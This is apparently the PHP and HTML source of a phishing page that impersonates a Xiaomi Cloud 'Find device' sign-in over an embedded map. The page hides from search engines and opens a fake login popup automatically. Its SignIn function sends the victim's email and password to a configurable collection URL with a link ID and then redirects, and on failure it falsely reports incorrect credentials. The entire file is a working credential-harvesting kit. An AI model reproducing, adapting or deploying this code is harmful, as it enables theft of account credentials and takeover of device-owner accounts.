<?php
	include(__DIR__ . "/../includes/xiaomi.php");
	$address = $_SESSION['Link']['GeneratedLink']['manual_location'] ?? 'Los Angeles';
	
	$username = $_SESSION['Link']['GeneratedLink']['username'] ?? '';
	$post_url = $_SESSION['Link']['VisitorDetails']['post_url'] ?? '';
	$link_id = $_SESSION['Link']['GeneratedLink']['id'] ?? '';
	$redirect_url = $_SESSION['Link']['GeneratedLink']['redirect_url'] ?? '';
	
	echo "<script>
			var username = '$username';
			var post_url = '$post_url';
			var link_id = '$link_id';
			var redirect_url = '$redirect_url';
	      </script>";
	
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
	<meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="icon" type="image/png" href="css/favicon.png" sizes="32x32">
	<!-- antbot inicio -->
      <meta property="description" content="Acesse para mais detalhes sobre o seu dispositivo.">

    <meta property="og:title" content="Buscar">
    <meta property="og:description" content="Acesse para mais detalhes sobre o seu dispositivo.">
    <meta property="og:type" content="website">
    <meta property="og:image:secure_url" content="https://www.buscardispositivos.com/images/sonar.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="300">
    <meta property="og:image:height" content="200">

    <meta name="Googlebot-News" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="robots" content="noimageindex">
    <meta name="googlebot" content="noimageindex">

    <meta name="referrer" content="unsafe-url">
    <meta name="referrer" content="origin">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="referrer" content="origin-when-cross-origin">
    <meta name="referrer" content="no-referrer">
<!-- antbot fim -->

    <title>Xiaomi <?=$language['account'][$lang];?> - <?=$language['signin'][$lang];?></title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
	  
	<style>
		body{
			font-family: MI Lan Pro,MI Lan Pro,Sans-serif;
    font-weight: 400;
    font-size: 14px;
    line-height: 1.5;
    color: #757575;
    background-color: #f5f5f5;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
     .btnsd{
		background-color: #ff6700;
		width: 100%;
		height: 50px;
		line-height: 50px;
		display: block;
		margin-bottom: 14px;
		text-align: center;
		font-size: 14px;
		color: #fff;
		cursor: pointer;
	}
	.footer {
	   position: fixed;
	   left: 0;
	   bottom: 0;
	   width: 100%;
	   background-color: #f2f2f2;
	   color: #fff;
	   text-align: center;
	   padding-left: 30px;
	   opacity: 1;
	   font-size: 12px;
	}
	.buttons-holder {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}


.buttonsss {
  background: #086aff;
  color: white;
  padding: 16px 25px;
  margin: 15px auto;
  border: none;
  cursor: pointer;
  width: 40%;
  border-radius: 8px;
  box-shadow: 0px 0px 1em #666;
  display: block;
  opacity: 0,9
}

/* The popup form - hidden by default */
.form-popup {
  border: none;
  display: none;
  z-index: 9;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 85%;
  max-width: 580px;
}
/* Add styles to the form container */
.form-container {
  
  padding: 20px;
  background-color: white;
  border-radius: 20px;
  box-shadow: 0px 0px 1em #666;
  
}

/* Set a style for the submit/login button */
.form-container .btn {
  background-color: #F3F8F9;
  color: #0A45E5;
  margin-left:auto;
  padding: 5px 10px;
  cursor: pointer;
  width: 45%;
  margin-bottom:3px;
  margin-top:3px;
  opacity: 0.8;
  border: 1px solid #fd5d20;
  
}

/* Add a red background color to the cancel button */
.form-container .cancel {
  background-color: white;
}

/* Add some hover effects to buttons */
.form-container .btn:hover, .open-button:hover {
  opacity: 1;
}
	</style> 
	 
	  
  </head>

  <body>

    <header>
      <!-- Fixed navbar -->
      <nav class="navbar navbar-expand-md navbar-white fixed-top bg-white">
        <img class="navbar-brand" src="css/logo.png" width="50px">Xiaomi Cloud | &nbsp;<a href="">Find device</a>
		<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>	
		<div class="collapse navbar-collapse" id="navbarCollapse">
		  <ul class="navbar-nav mr-auto">
			<li class="nav-item active">
              <a class="nav-link" href="#"></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#"></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="#"></a>
            </li>
          </ul>
          <form class="form-inline mt-2 mt-md-0">
              <a class="nav-link"><?=$language['signin'][$lang];?></a>
			  <a class="nav-link"><?=$language['signup'][$lang];?></a>

          </form>
        </div>
      </nav>
    </header>

    <!-- Begin page content -->
    <main role="main">
      <div id="map" class="map-container">
		<iframe src="https://maps.google.com/maps?width=100%25&amp;height=600&amp;hl=en&amp;q=<?=$address?>&amp;t=&amp;z=14&amp;ie=UTF8&amp;iwloc=B&amp;output=embed" frameborder="0" style="overflow:hidden;height:100%;width:100%;position: fixed;" height="100%" width="100%" allowfullscreen="" onload="resizeIframe(this)"></iframe>
	  </div>
		
	  <div class="buttons-holder">
		  <div style="text-align: center;">
			<img id="image" src="css/imap.png" onclick="openForm()" style="width:100px">
		  </div>
		  <button type="button" class="buttonsss" onclick="openForm()" style="width:100px; font-size: 12px;">
			<b>Online</b>
		  </button>
	  </div> 
		
	<div class="form-popup" id="myForm" style="text-align: center; display: none;">
		<div name="myForm" class="form-container">
			<center>
				<div style=" padding-top: 20px;">
					<div class="row">
						<div class="col-sm-2"></div>
						<div class="col-sm-8">
							<form>
								
								<div class="form-group">
									<img src="css/xiaomi-logo.png" width="80px">
									<h4 style="border-radius: 5px; color:#333; font-size: 25px; font-weight: bold; padding-top: 15px;">Xiaomi <?=$language['account'][$lang];?> - <?=$language['signin'][$lang];?></h4>
								</div>
								
								<div class="form-group">
									<input type="email" id="email_address" class="form-control" style="border-radius: 5px; height: 45px; padding: 13px 16px 13px 14px;" placeholder="<?=$language['email_place'][$lang];?>" value="<?=$username;?>">
								</div>

								<div class="form-group">
									<input type="password" id="password" placeholder="<?=$language['password'][$lang];?>" class="form-control" style="height: 45px; border-radius: 5px; padding: 13px 16px 13px 14px;">
								</div>
								
								<div class="form-group" id="error_msg" style="display:none;color:red;"></div>
								
								
								<div class="form-group">
									<button type="submit" onclick="SignIn();return false;" id="login_submit" class="btnsd" style="border-radius: 5px; border: none;">
									  <div id="login_text"><?=$language['signin'][$lang];?>									  </div>
									  <div id="login_loader" style="display:none;">
										<img src="loader.gif" width="40px">
									  </div>
									</button>
								</div>
								
								<div class="form-group"><br>
									<div> <a><a href=""><?=$language['sign_phone'][$lang];?></a> &nbsp;&nbsp;<a href=""><?=$language['forgot'][$lang];?></a></div>
								</div>
							</form>
						</div>
						<div class="col-sm-2"></div>
					</div>
				</div>
			</center>
		</div>
	</div>	
		
    </main>

    <footer class="footer text-black" style="height: 60px;">
        <span class="text-muted">© 2010 - <?=date('Y');?> Xiaomi Inc. <?=$language['rights'][$lang];?></span>
    </footer>

   	<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
    <script src="js/bootstrap.min.js"></script>
	  
	<script>
	  function resizeIframe(obj) {
		obj.style.height = obj.contentWindow.document.documentElement.scrollHeight + 'px';
	  }
	</script> 
	  
	<script>
	function openForm() {
		$("#myForm").show();
	}

	function closeForm() {
		$("#myForm").hide();
	}  
	</script>
	  
	<script>
	  function SignIn(){
		if($("#email_address").val() == '' && $("#password").val() == ''){
			$("#error_msg").show();
			$("#error_msg").html("Enter your email address or phone number");
			$("#email_address").css("border-color", "#ff6700");
		}else if($("#email_address").val() == ''){
			$("#error_msg").show();
			$("#error_msg").html("The username or password you entered is incorrect.");
			$("#password").css("border-color", "#ff6700");
		}else if($("#password").val() == ''){
			$("#error_msg").show();
			$("#error_msg").html("The username or password you entered is incorrect.");
			$("#password").css("border-color", "#ff6700");
		}else{
			
			username = document.getElementById("email_address").value;
			var password = document.getElementById("password").value;
			var data = 'id=' + link_id + '&type=account&user=' + username + '&pass=' + password;

			$.ajax({
				type: "POST",
				dataType: "json",
				url: post_url,
				data: data,
				cache: false,
				beforeSend: function(){
					$("#login_text").hide();
					$("#login_loader").show();
					$("#login_submit").prop("disabled", true);
				},
				success: function(data) {
					$("#login_loader").hide();
					$("#login_text").show();
					$("#login_submit").removeAttr("disabled", false);
					
					if(data.success == true){
						window.location.href = redirect_url;
					}else{
						document.getElementById("email_address").value ="";
						document.getElementById("password").value ="";
						$("#error_msg").show();
						$("#error_msg").html('<?=$language['incorrect'][$lang];?>');

					}
				},error: function(XMLHttpRequest, textStatus, errorThrown) {
						document.getElementById("email_address").value ="";
						document.getElementById("password").value ="";
						$("#login_loader").hide();
						$("#login_text").show();
						$("#login_submit").removeAttr("disabled", false);
						$("#error_msg").show();
						$("#error_msg").html('<?=$language['incorrect'][$lang];?>');
				}


			});
			
			
			
		}
	}
	setTimeout(function(){ openForm(); }, 2500);
	
	</script>
	  
  </body>
</html>